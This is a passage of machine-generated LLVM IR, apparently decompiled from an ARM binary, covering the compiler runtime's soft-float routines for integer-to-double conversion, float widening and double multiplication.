  store i32 %v6_177c0, i32* %r1.global-to-local, align 4
  br i1 %v4_177bc, label %bb49, label %.thread31

bb49:                                             ; preds = %bb48
  %v6_177c4 = load i32, i32* @r0, align 4
  %v7_177c4 = load i32, i32* @ip, align 4
  %v12_177c4 = lshr i32 %v6_177c4, %v7_177c4
  %v13_177c4 = or i32 %v12_177c4, %v6_177c0
  store i32 %v13_177c4, i32* %r1.global-to-local, align 4
  %v11_177c8 = shl i32 %v6_177c4, %v6_177c8
  store i32 %v11_177c8, i32* @r0, align 4
  br label %.thread31

.thread31:                                        ; preds = %bb48, %dec_label_pc_177a4, %bb49
  %v6_177d0 = phi i32 [ %v6_177b0, %dec_label_pc_177a4 ], [ %v13_177c4, %bb49 ], [ %v6_177c0, %bb48 ]
  %v0_177cc = load i32, i32* @r4, align 4
  %v2_177cc = sub i32 %v0_177cc, %v5_17790
  store i32 %v2_177cc, i32* %r4.global-to-local, align 4
  %v4_177cc = xor i32 %v0_177cc, %v5_17790
  %v5_177cc = xor i32 %v2_177cc, %v0_177cc
  %v6_177cc = and i32 %v5_177cc, %v4_177cc
  %v7_177cc = icmp slt i32 %v6_177cc, 0
  %v8_177cc = icmp slt i32 %v2_177cc, 0
  %v5_177d0 = icmp slt i32 %v0_177cc, %v5_17790
  br i1 %v5_177d0, label %.thread8, label %bb50

bb50:                                             ; preds = %.thread31
  %v10_177d0 = mul i32 %v2_177cc, 1048576
  %v11_177d0 = add i32 %v10_177d0, %v6_177d0
  %v7_177d4 = load i32, i32* @r5, align 4
  %v8_177d4 = or i32 %v7_177d4, %v11_177d0
  store i32 %v8_177d4, i32* %r1.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %.thread31, %bb50
  %v3_177dc = xor i1 %v8_177cc, %v7_177cc
  %v4_177dc = xor i1 %v3_177dc, true
  call void @__pseudo_cond_branch(i1 %v4_177dc, i32 %tmp33)
  %v0_177e0 = load i32, i32* %r4.global-to-local, align 4
  %v2_177e4 = sub i32 -32, %v0_177e0
  store i32 %v2_177e4, i32* %r4.global-to-local, align 4
  %v6_177e8 = icmp sgt i32 %v0_177e0, -32
  br i1 %v6_177e8, label %dec_label_pc_177ec, label %dec_label_pc_1782c

dec_label_pc_177ec:                               ; preds = %.thread8
  %v1_177ec = add i32 %v2_177e4, 12
  store i32 %v1_177ec, i32* %r4.global-to-local, align 4
  %v8_177f0 = icmp sgt i32 %v1_177ec, 0
  br i1 %v8_177f0, label %dec_label_pc_17810, label %dec_label_pc_177f4

dec_label_pc_177f4:                               ; preds = %dec_label_pc_177ec
  %v1_177f4 = add i32 %v2_177e4, 32
  %v1_177f8 = sub i32 0, %v2_177e4
  %v0_177fc = load i32, i32* @r0, align 4
  %v6_177fc = lshr i32 %v0_177fc, %v1_177f4
  %v1_17800 = load i32, i32* %r1.global-to-local, align 4
  %v7_17800 = shl i32 %v1_17800, %v1_177f8
  %v8_17800 = or i32 %v7_17800, %v6_177fc
  %v0_17804 = load i32, i32* @r5, align 4
  %v7_17804 = lshr i32 %v1_17800, %v1_177f4
  %v8_17804 = or i32 %v0_17804, %v7_17804
  store i32 %v8_17804, i32* %r1.global-to-local, align 4
  %v2_17808 = load i32, i32* %stack_var_12, align 4
  store i32 %v2_17808, i32* %r4.global-to-local, align 4
  ret i32 %v8_17800

dec_label_pc_17810:                               ; preds = %dec_label_pc_177ec
  %v1_17810 = sub i32 0, %v2_177e4
  %v1_17814 = add i32 %v2_177e4, 32
  %v0_17818 = load i32, i32* @r0, align 4
  %v6_17818 = lshr i32 %v0_17818, %v1_17814
  %v1_1781c = load i32, i32* %r1.global-to-local, align 4
  %v7_1781c = shl i32 %v1_1781c, %v1_17810
  %v8_1781c = or i32 %v7_1781c, %v6_17818
  %v0_17820 = load i32, i32* @r5, align 4
  store i32 %v0_17820, i32* %r1.global-to-local, align 4
  %v2_17824 = load i32, i32* %stack_var_12, align 4
  store i32 %v2_17824, i32* %r4.global-to-local, align 4
  ret i32 %v8_1781c

dec_label_pc_1782c:                               ; preds = %.thread8
  %v0_1782c = load i32, i32* %r1.global-to-local, align 4
  %v6_1782c = lshr i32 %v0_1782c, %v2_177e4
  %v0_17830 = load i32, i32* @r5, align 4
  store i32 %v0_17830, i32* %r1.global-to-local, align 4
  %v2_17834 = load i32, i32* %stack_var_12, align 4
  store i32 %v2_17834, i32* %r4.global-to-local, align 4
  ret i32 %v6_1782c

; uselistorder directives
  uselistorder i32 %v2_177e4, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32 %v2_177cc, { 1, 2, 0, 3 }
  uselistorder i32 %v0_177cc, { 2, 0, 1, 3 }
  uselistorder i32 %v6_177c0, { 1, 0, 2 }
  uselistorder i32 %v2_17794, { 1, 0, 2 }
  uselistorder i32 %v5_17790, { 6, 0, 5, 7, 3, 8, 2, 4, 9, 10, 1, 12, 11 }
  uselistorder i32 %v4_1777c, { 1, 0 }
  uselistorder i32 %v1_1777c, { 1, 0, 2, 3 }
  uselistorder i32 %v4_17770, { 1, 0 }
  uselistorder i32 %v1_17770, { 1, 0, 2, 3 }
  uselistorder i32 %v4_17764, { 1, 0 }
  uselistorder i32 %v0_177b0, { 3, 1, 2, 4, 0, 5, 6 }
  uselistorder i32* %r1.global-to-local, { 1, 9, 2, 7, 3, 8, 4, 5, 6, 10, 0 }
  uselistorder i32 -12, { 4, 1, 0, 5, 15, 16, 6, 18, 19, 7, 20, 21, 17, 14, 13, 12, 11, 10, 22, 23, 24, 25, 9, 26, 2, 8, 3, 27, 28, 29 }
  uselistorder i32 -20, { 0, 2, 1 }
  uselistorder i32 -4, { 12, 0, 1, 49, 13, 69, 14, 22, 73, 74, 75, 8, 23, 24, 25, 76, 77, 78, 9, 26, 27, 28, 79, 80, 81, 10, 29, 30, 82, 21, 20, 83, 84, 85, 19, 18, 17, 16, 31, 32, 33, 34, 35, 7, 36, 5, 37, 6, 86, 15, 38, 46, 47, 48, 39, 40, 63, 65, 66, 11, 67, 68, 64, 41, 62, 2, 42, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 43, 70, 71, 72, 44, 4, 3, 45 }
  uselistorder i32 -8, { 4, 5, 0, 33, 12, 13, 14, 15, 16, 17, 11, 10, 3, 9, 8, 7, 6, 18, 19, 20, 21, 22, 2, 37, 23, 24, 25, 26, 27, 34, 35, 28, 36, 32, 29, 30, 31, 1, 38, 39 }
  uselistorder i32 255, { 7, 8, 4, 11, 12, 3, 5, 6, 10, 0, 1, 2, 9 }
  uselistorder i32 -16, { 2, 23, 7, 8, 9, 10, 11, 12, 13, 14, 15, 6, 5, 4, 1, 16, 17, 18, 19, 20, 21, 3, 0, 22 }
  uselistorder i32 65535, { 3, 4, 1, 0, 2, 5 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %.thread31, { 2, 0, 1 }
  uselistorder label %bb48, { 1, 0 }
  uselistorder label %dec_label_pc_177bc, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %.thread5, { 2, 0, 1 }
  uselistorder label %.thread4, { 2, 0, 1 }
  uselistorder label %.thread3, { 2, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_1783c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9) local_unnamed_addr {
dec_label_pc_1783c:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_1783c = load i32, i32* @r4, align 4
  %v2_1783c = icmp eq i32 %v0_1783c, 0
  %v1_17840 = xor i32 %arg3, 1048576
  store i32 %v1_17840, i32* @r3, align 4
  br i1 %v2_1783c, label %.thread, label %.thread1

.thread:                                          ; preds = %dec_label_pc_1783c
  %v1_17844 = load i32, i32* @r1, align 4
  %v2_17844 = xor i32 %v1_17844, 1048576
  store i32 %v2_17844, i32* @r1, align 4
  store i32 1, i32* @r4, align 4
  br label %bb

.thread1:                                         ; preds = %dec_label_pc_1783c
  %v1_1784c = load i32, i32* @r5, align 4
  %v2_1784c = add i32 %v1_1784c, -1
  store i32 %v2_1784c, i32* @r5, align 4
  br label %bb

bb:                                               ; preds = %.thread, %.thread1
  %v0_17850 = call i32 @function_17694()
  store i32 %v0_17850, i32* %r0.global-to-local, align 4
  %v0_17854 = load i32, i32* @r4, align 4
  %v0_17854.off = add i32 %v0_17854, 4194303
  %tmp = icmp ult i32 %v0_17854.off, 2097152
  %v1_178e4 = load i32, i32* @r5, align 4
  %v1_178e4.off = add i32 %v1_178e4, 4194303
  %tmp44 = icmp ult i32 %v1_178e4.off, 2097152
  br i1 %tmp, label %.thread11, label %bb30

bb30:                                             ; preds = %bb
  br i1 %tmp44, label %bb37, label %dec_label_pc_17860

dec_label_pc_17860:                               ; preds = %bb30
  %v4_17860 = icmp eq i32 %v1_178e4, %v0_17854
  br i1 %v4_17860, label %bb31, label %dec_label_pc_1786c

bb31:                                             ; preds = %dec_label_pc_17860
  %v2_17864 = load i32, i32* @r2, align 4
  %v5_17864 = icmp eq i32 %v2_17864, %v0_17850
  br i1 %v5_17864, label %dec_label_pc_17880, label %dec_label_pc_1786c

dec_label_pc_1786c:                               ; preds = %dec_label_pc_17860, %bb31
  %v2_1786c = or i32 %v0_17854, %v0_17850
  %v4_1786c = icmp eq i32 %v2_1786c, 0
  br i1 %v4_1786c, label %bb32, label %.thread6

bb32:                                             ; preds = %dec_label_pc_1786c
  %v1_17874 = load i32, i32* @r2, align 4
  store i32 %v1_17874, i32* %r0.global-to-local, align 4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_1786c, %bb32
  %v1_1787c = phi i32 [ %v0_17850, %dec_label_pc_1786c ], [ %v1_17874, %bb32 ]
  ret i32 %v1_1787c

dec_label_pc_17880:                               ; preds = %bb31
  %v0_17880 = load i32, i32* @r1, align 4
  %v1_17880 = load i32, i32* @r3, align 4
  %v4_17880 = icmp eq i32 %v1_17880, %v0_17880
  br i1 %v4_17880, label %dec_label_pc_17880..thread8_crit_edge, label %bb33

dec_label_pc_17880..thread8_crit_edge:            ; preds = %dec_label_pc_17880
  %v0_17890.pre = load i32, i32* @lr, align 4
  br label %.thread8

bb33:                                             ; preds = %dec_label_pc_17880
  store i32 0, i32* @r1, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %arg4, i32* @r4, align 4
  store i32 %arg6, i32* @lr, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_17880..thread8_crit_edge, %bb33
  %v0_17890 = phi i32 [ %v0_17890.pre, %dec_label_pc_17880..thread8_crit_edge ], [ %arg6, %bb33 ]
  %v2_17890 = xor i1 %v4_17880, true
  call void @__pseudo_cond_branch(i1 %v2_17890, i32 %v0_17890)
  %v0_17894 = load i32, i32* @r4, align 4
  %tmp45 = icmp ult i32 %v0_17894, 2097152
  br i1 %tmp45, label %dec_label_pc_1789c, label %dec_label_pc_178b0

dec_label_pc_1789c:                               ; preds = %.thread8
  %v0_1789c = load i32, i32* %r0.global-to-local, align 4
  %v1_1789c = icmp slt i32 %v0_1789c, 0
  %v2_1789c = mul i32 %v0_1789c, 2
  store i32 %v2_1789c, i32* %r0.global-to-local, align 4
  %v0_178a0 = load i32, i32* @r1, align 4
  %v3_178a0 = mul i32 %v0_178a0, 2
  %v4_178a0 = zext i1 %v1_1789c to i32
  %v5_178a0 = or i32 %v3_178a0, %v4_178a0
  %v9_178a0 = icmp ule i32 %v5_178a0, %v0_178a0
  %v10_178a0 = icmp ult i32 %v3_178a0, %v0_178a0
  %v11_178a0 = select i1 %v1_1789c, i1 %v9_178a0, i1 %v10_178a0
  br i1 %v11_178a0, label %bb34, label %bb35

bb34:                                             ; preds = %dec_label_pc_1789c
  br label %bb35

bb35:                                             ; preds = %dec_label_pc_1789c, %bb34
  ret i32 %v2_1789c

dec_label_pc_178b0:                               ; preds = %.thread8
  %v2_178b0 = icmp ugt i32 %v0_17894, -4194305
  br i1 %v2_178b0, label %dec_label_pc_178b0..thread9_crit_edge, label %bb36

dec_label_pc_178b0..thread9_crit_edge:            ; preds = %dec_label_pc_178b0
  %v0_178bc.pre = load i32, i32* @lr, align 4
  br label %.thread9

bb36:                                             ; preds = %dec_label_pc_178b0
  %v1_178b4 = load i32, i32* @r1, align 4
  %v2_178b4 = add i32 %v1_178b4, 1048576
  store i32 %v2_178b4, i32* @r1, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_178b0..thread9_crit_edge, %bb36
  %v0_178bc = phi i32 [ %v0_178bc.pre, %dec_label_pc_178b0..thread9_crit_edge ], [ %arg9, %bb36 ]
  %v2_178bc = xor i1 %v2_178b0, true
  call void @__pseudo_cond_branch(i1 %v2_178bc, i32 %v0_178bc)
  store i32 0, i32* %r0.global-to-local, align 4
  ret i32 0

.thread11:                                        ; preds = %bb
  %v1_178f0.pre = load i32, i32* @r1, align 4
  br i1 %tmp44, label %.thread13, label %.thread14

.thread14:                                        ; preds = %.thread11
  store i32 %v1_178f0.pre, i32* @r3, align 4
  br label %bb38

bb37:                                             ; preds = %bb30
  %v1_178dc = load i32, i32* @r3, align 4
  %v1_178e0 = load i32, i32* @r2, align 4
  store i32 %v1_178e0, i32* %r0.global-to-local, align 4
  br label %bb38

bb38:                                             ; preds = %bb37, %.thread14
  %v1_178f023 = phi i32 [ %v1_178f0.pre, %.thread14 ], [ %v1_178dc, %bb37 ]
  %v1_178ec = phi i32 [ %v0_17850, %.thread14 ], [ %v1_178e0, %bb37 ]
  store i32 %v1_178ec, i32* @r2, align 4
  br label %.thread13

.thread13:                                        ; preds = %.thread11, %bb38
  %v1_178fc = phi i32 [ %v1_178f023, %bb38 ], [ %v1_178f0.pre, %.thread11 ]
  %v1_17904 = phi i32 [ %v1_178ec, %bb38 ], [ %v0_17850, %.thread11 ]
  %v4_178f0 = mul i32 %v1_178fc, 4096
  %v5_178f0 = or i32 %v4_178f0, %v1_17904
  %v7_178f0 = icmp eq i32 %v5_178f0, 0
  br i1 %v7_178f0, label %bb39, label %.thread17

bb39:                                             ; preds = %.thread13
  %v1_178f4 = load i32, i32* @r2, align 4
  %v2_178f4 = load i32, i32* @r3, align 4
  %v5_178f4 = mul i32 %v2_178f4, 4096
  %v6_178f4 = or i32 %v5_178f4, %v1_178f4
  %v8_178f4 = icmp eq i32 %v6_178f4, 0
  br i1 %v8_178f4, label %bb40, label %.thread17

bb40:                                             ; preds = %bb39
  %v5_178f8 = icmp eq i32 %v2_178f4, %v1_178fc
  br i1 %v5_178f8, label %bb41, label %.thread17

.thread17:                                        ; preds = %.thread13, %bb39, %bb40
  br label %bb41

bb41:                                             ; preds = %bb40, %.thread17
  ret i32 %v1_17904

; uselistorder directives
  uselistorder i32 %v1_178f0.pre, { 0, 2, 1 }
  uselistorder i32 %v0_178a0, { 1, 2, 0 }
  uselistorder i32 %v2_1789c, { 1, 0 }
  uselistorder i1 %v1_1789c, { 1, 0 }
  uselistorder i32 %v0_17894, { 1, 0 }
  uselistorder i1 %v4_17880, { 1, 0 }
  uselistorder i32 %v0_17854, { 2, 0, 1 }
  uselistorder i32 %v0_17850, { 2, 3, 4, 1, 0, 5 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %bb41, { 1, 0 }
  uselistorder label %.thread17, { 2, 1, 0 }
  uselistorder label %.thread13, { 1, 0 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %bb35, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %dec_label_pc_1786c, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @__aeabi_ui2d(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v2_17908 = icmp eq i32 %arg1, 0
  br i1 %v2_17908, label %bb, label %bb3

bb:                                               ; preds = %entry
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v0_17910 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_17908, i32 %v0_17910)
  store i32 1074, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  store i32 0, i32* @r1, align 4
  %v0_17928 = call i32 @function_17748()
  ret i32 %v0_17928

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__floatsidf(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v2_1792c = icmp eq i32 %arg1, 0
  br i1 %v2_1792c, label %bb, label %bb3

bb:                                               ; preds = %entry
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v0_17934 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_1792c, i32 %v0_17934)
  store i32 1074, i32* @r4, align 4
  %v1_17944 = and i32 %arg1, -2147483648
  store i32 %v1_17944, i32* @r5, align 4
  %v2_17944 = icmp eq i32 %v1_17944, 0
  br i1 %v2_17944, label %bb5, label %bb4

bb4:                                              ; preds = %bb3
  %v2_17948 = sub i32 0, %arg1
  store i32 %v2_17948, i32* @r0, align 4
  br label %bb5

bb5:                                              ; preds = %bb3, %bb4
  store i32 0, i32* @r1, align 4
  %v0_17950 = call i32 @function_17748()
  ret i32 %v0_17950

; uselistorder directives
  uselistorder i32 %arg1, { 0, 2, 1, 3 }
  uselistorder label %bb5, { 1, 0 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__extendsfdf2(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %v2_17954 = mul i32 %arg1, 2
  store i32 %v2_17954, i32* %r2.global-to-local, align 4
  %v4_17954 = icmp eq i32 %v2_17954, 0
  %v1_17958 = and i32 %v2_17954, 4
  %v2_17958 = icmp ne i32 %v1_17958, 0
  %v3_17958 = sdiv i32 %v2_17954, 8
  %v3_1795c = zext i1 %v2_17958 to i32
  %v6_1795c = zext i32 %v3_17958 to i64
  %v7_1795c = sub nsw i32 33, %v3_17958
  %v8_1795c = zext i32 %v7_1795c to i64
  %v9_1795c = shl i64 %v6_1795c, %v8_1795c
  %v10_1795c = sub nsw i32 32, %v3_17958
  %v11_1795c = shl i32 %v3_1795c, %v10_1795c
  %v12_1795c = zext i32 %v11_1795c to i64
  %v14_1795c = or i64 %v12_1795c, %v9_1795c
  %v15_1795c = trunc i64 %v14_1795c to i32
  store i32 %v15_1795c, i32* %r1.global-to-local, align 4
  %v3_17960 = mul i32 %arg1, 536870912
  store i32 %v3_17960, i32* @r0, align 4
  br i1 %v4_17954, label %.thread1, label %bb

bb:                                               ; preds = %entry
  %v2_17964 = and i32 %v2_17954, -16777216
  store i32 %v2_17964, i32* @r3, align 4
  %v4_17964 = icmp eq i32 %v2_17964, 0
  br i1 %v4_17964, label %.thread1, label %bb7

bb7:                                              ; preds = %bb
  %v4_17968 = icmp ugt i32 %v2_17954, -16777217
  br i1 %v4_17968, label %.thread1, label %bb8

bb8:                                              ; preds = %bb7
  %v2_1796c = xor i32 %v15_1795c, 939524096
  store i32 %v2_1796c, i32* %r1.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb, %bb7, %bb8
  %v1_17970 = phi i1 [ false, %bb ], [ false, %bb7 ], [ true, %bb8 ], [ false, %entry ]
  %v0_17970 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v1_17970, i32 %v0_17970)
  %v0_17974 = load i32, i32* %r2.global-to-local, align 4
  %v2_17974 = icmp eq i32 %v0_17974, 0
  br i1 %v2_17974, label %bb10, label %bb9

bb9:                                              ; preds = %.thread1
  %v1_17978 = load i32, i32* @r3, align 4
  %v4_17978 = icmp eq i32 %v1_17978, -16777216
  br label %bb10

bb10:                                             ; preds = %.thread1, %bb9
  %v1_1797c = phi i1 [ true, %.thread1 ], [ %v4_17978, %bb9 ]
  %v0_1797c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v1_1797c, i32 %v0_1797c)
  store i32 896, i32* @r4, align 4
  %v0_17988 = load i32, i32* %r1.global-to-local, align 4
  %v1_17988 = and i32 %v0_17988, -2147483648
  store i32 %v1_17988, i32* @r5, align 4
  %tmp = bitcast i32 %v0_17988 to float
  %tmp11 = call float @fabsf(float %tmp)
  %v1_1798c = bitcast float %tmp11 to i32
  store i32 %v1_1798c, i32* @r1, align 4
  %v0_17990 = call i32 @function_17748()
  ret i32 %v0_17990

; uselistorder directives
  uselistorder i32 %v3_17958, { 1, 2, 0 }
  uselistorder i32 %v2_17954, { 0, 4, 5, 3, 2, 1 }
  uselistorder i32* %r1.global-to-local, { 1, 0, 2 }
  uselistorder i32 ()* @function_17748, { 2, 1, 0 }
  uselistorder label %bb10, { 1, 0 }
  uselistorder label %.thread1, { 3, 2, 1, 0 }
}

define i32 @__aeabi_ul2d(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %v2_17994 = or i32 %arg2, %arg1
  %v4_17994 = icmp eq i32 %v2_17994, 0
  %v0_17998 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_17994, i32 %v0_17998)
  store i32 0, i32* @r5, align 4
  %v0_179a4 = call i32 @function_179c4()
  ret i32 %v0_179a4
}

define i32 @__floatdidf(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_179a8 = or i32 %arg2, %arg1
  %v4_179a8 = icmp eq i32 %v2_179a8, 0
  %v0_179ac = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_179a8, i32 %v0_179ac)
  %v1_179b8 = icmp sgt i32 %arg2, -1
  call void @__pseudo_cond_branch(i1 %v1_179b8, i32 ptrtoint (i32* @global_var_179c4.694 to i32))
  %v1_179bc = sub i32 0, %arg1
  ret i32 %v1_179bc

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_179c4() local_unnamed_addr {
dec_label_pc_179c4:
  %r4.global-to-local = alloca i32, align 4
  store i32 1074, i32* %r4.global-to-local, align 4
  %v0_179cc = load i32, i32* @r1, align 4
  %tmp = icmp ult i32 %v0_179cc, 4194304
  call void @__pseudo_cond_branch(i1 %tmp, i32 ptrtoint (i32* @global_var_176e8.692 to i32))
  %tmp6 = icmp ult i32 %v0_179cc, 33554432
  br i1 %tmp6, label %bb3, label %bb

bb:                                               ; preds = %dec_label_pc_179c4
  br label %bb3

bb3:                                              ; preds = %dec_label_pc_179c4, %bb
  %v1_179e4 = phi i32 [ 3, %dec_label_pc_179c4 ], [ 6, %bb ]
  %tmp7 = icmp ult i32 %v0_179cc, 268435456
  br i1 %tmp7, label %bb5, label %bb4

bb4:                                              ; preds = %bb3
  %v2_179e4 = add nuw nsw i32 %v1_179e4, 3
  br label %bb5

bb5:                                              ; preds = %bb3, %bb4
  %v0_179e8 = phi i32 [ %v1_179e4, %bb3 ], [ %v2_179e4, %bb4 ]
  %not. = icmp slt i32 %v0_179cc, 0
  %v4_179e8 = zext i1 %not. to i32
  %v5_179e8 = add nsw i32 %v0_179e8, %v4_179e8
  %v1_179ec = sub nsw i32 32, %v5_179e8
  %v0_179f0 = load i32, i32* @r0, align 4
  %v6_179f0 = shl i32 %v0_179f0, %v1_179ec
  store i32 %v6_179f0, i32* @ip, align 4
  %v6_179f4 = lshr i32 %v0_179f0, %v5_179e8
  %v1_179f8 = load i32, i32* @r1, align 4
  %v7_179f8 = shl i32 %v1_179f8, %v1_179ec
  %v8_179f8 = or i32 %v7_179f8, %v6_179f4
  %v6_179fc = lshr i32 %v1_179f8, %v5_179e8
  %v0_17a00 = load i32, i32* %r4.global-to-local, align 4
  %v2_17a00 = add i32 %v0_17a00, %v5_179e8
  store i32 %v2_17a00, i32* @r4, align 4
  %v4_17a04 = sext i32 %v8_179f8 to i64
  %v5_17a04 = call i32 @function_176e8(i64 %v4_17a04, i32 %v6_179fc, i32 %v5_179e8, i32 %v1_179ec)
  ret i32 %v5_17a04

; uselistorder directives
  uselistorder i32 %v5_179e8, { 2, 0, 1, 3, 4 }
  uselistorder label %bb5, { 1, 0 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__aeabi_dmul(i64 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = sext i32 %arg3 to i64
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp32 = trunc i64 %arg1 to i32
  store i32 %tmp32, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_17a08 = load i32, i32* @r4, align 4
  store i32 %v3_17a08, i32* %stack_var_-16, align 4
  %v12_17a08 = load i32, i32* @lr, align 4
  store i32 2047, i32* %ip.global-to-local, align 4
  %v4_17a14 = udiv i32 %arg2, 1048576
  %v5_17a14 = urem i32 %v4_17a14, 2048
  store i32 %v5_17a14, i32* %r4.global-to-local, align 4
  %v6_17a14 = icmp eq i32 %v5_17a14, 0
  br i1 %v6_17a14, label %.thread2, label %bb

bb:                                               ; preds = %entry
  %v5_17a18 = udiv i32 %arg4, 1048576
  %v6_17a18 = urem i32 %v5_17a18, 2048
  store i32 %v6_17a18, i32* @r5, align 4
  %v7_17a18 = icmp eq i32 %v6_17a18, 0
  br i1 %v7_17a18, label %.thread2, label %bb38

bb38:                                             ; preds = %bb
  %v5_17a1c = icmp eq i32 %v5_17a14, 2047
  br i1 %v5_17a1c, label %.thread2, label %bb39

bb39:                                             ; preds = %bb38
  %v5_17a20 = icmp eq i32 %v6_17a18, 2047
  br label %.thread2

.thread2:                                         ; preds = %entry, %bb, %bb38, %bb39
  %v0_17a24 = phi i1 [ true, %bb ], [ true, %bb38 ], [ %v5_17a20, %bb39 ], [ true, %entry ]
  store i32 ptrtoint (i32* @global_var_17a28.697 to i32), i32* %lr.global-to-local, align 4
  call void @__pseudo_cond_branch(i1 %v0_17a24, i32 ptrtoint (i32* @global_var_17c00.695 to i32))
  %v0_17a28 = load i32, i32* %r4.global-to-local, align 4
  %v1_17a28 = load i32, i32* @r5, align 4
  %v2_17a28 = add i32 %v1_17a28, %v0_17a28
  store i32 %v2_17a28, i32* %r4.global-to-local, align 4
  %v2_17a2c = xor i32 %arg4, %arg2
  %v1_17a30 = load i32, i32* %ip.global-to-local, align 4
  %tmp51 = mul i32 %v1_17a30, -2097152
  %v5_17a30 = add i32 %tmp51, -1
  %v6_17a30 = and i32 %v5_17a30, %arg2
  store i32 %v6_17a30, i32* %r1.global-to-local, align 4
  %v6_17a34 = and i32 %v5_17a30, %arg4
  %v5_17a38 = mul i32 %arg2, 4096
  %v6_17a38 = or i32 %v5_17a38, %tmp32
  %v8_17a38 = icmp eq i32 %v6_17a38, 0
  br i1 %v8_17a38, label %.thread3, label %bb40

.thread3:                                         ; preds = %.thread2
  %v1_17a405 = or i32 %v6_17a30, 1048576
  store i32 %v1_17a405, i32* %r1.global-to-local, align 4
  %v1_17a447 = or i32 %v6_17a34, 1048576
  br label %dec_label_pc_17ac4

bb40:                                             ; preds = %.thread2
  %v6_17a3c = mul i32 %arg4, 4096
  %v7_17a3c = or i32 %v6_17a3c, %arg3
  %v9_17a3c = icmp eq i32 %v7_17a3c, 0
  %v1_17a40 = or i32 %v6_17a30, 1048576
  store i32 %v1_17a40, i32* %r1.global-to-local, align 4
  %v1_17a44 = or i32 %v6_17a34, 1048576
  br i1 %v9_17a3c, label %dec_label_pc_17ac4, label %dec_label_pc_17a4c

dec_label_pc_17a4c:                               ; preds = %bb40
  %v6_17a4c = mul nuw i64 %tmp, %arg1
  %v7_17a4c = udiv i64 %v6_17a4c, 4294967296
  %v9_17a4c = trunc i64 %v6_17a4c to i32
  store i32 %v9_17a4c, i32* %ip.global-to-local, align 4
  %v7_17a54 = zext i32 %v1_17a40 to i64
  %v11_17a54 = mul nuw nsw i64 %v7_17a54, %tmp
  %v12_17a54 = add i64 %v11_17a54, %v7_17a4c
  %v1_17a58 = and i32 %v2_17a2c, -2147483648
  %v10_17a5c = zext i32 %v1_17a44 to i64
  %v11_17a5c = mul nuw i64 %v10_17a5c, %arg1
  %v12_17a5c = add i64 %v12_17a54, %v11_17a5c
  %v13_17a5c = udiv i64 %v12_17a5c, 4294967296
  %v15_17a5c = trunc i64 %v12_17a5c to i32
  %v10_17a64 = mul nuw i64 %v10_17a5c, %v7_17a54
  %v11_17a64 = add i64 %v13_17a5c, %v10_17a64
  %v12_17a64 = udiv i64 %v11_17a64, 4294967296
  %v13_17a64 = trunc i64 %v12_17a64 to i32
  %v14_17a64 = trunc i64 %v11_17a64 to i32
  %v2_17a68 = icmp eq i32 %v9_17a4c, 0
  br i1 %v2_17a68, label %bb42, label %bb41

bb41:                                             ; preds = %dec_label_pc_17a4c
  %v2_17a6c = or i32 %v15_17a5c, 1
  br label %bb42

bb42:                                             ; preds = %dec_label_pc_17a4c, %bb41
  %storemerge = phi i32 [ %v2_17a6c, %bb41 ], [ %v15_17a5c, %dec_label_pc_17a4c ]
  %v0_17a80 = phi i32 [ %v2_17a6c, %bb41 ], [ %v15_17a5c, %dec_label_pc_17a4c ]
  store i32 %storemerge, i32* %lr.global-to-local, align 4
  %v1_17a70 = add i32 %v2_17a28, -255
  %v2_17a74 = icmp ugt i32 %v13_17a64, 511
  %v2_17a78 = icmp eq i1 %v2_17a74, false
  %v3_17a78 = add i32 %v2_17a28, -1023
  %v5_17a78 = sext i1 %v2_17a78 to i32
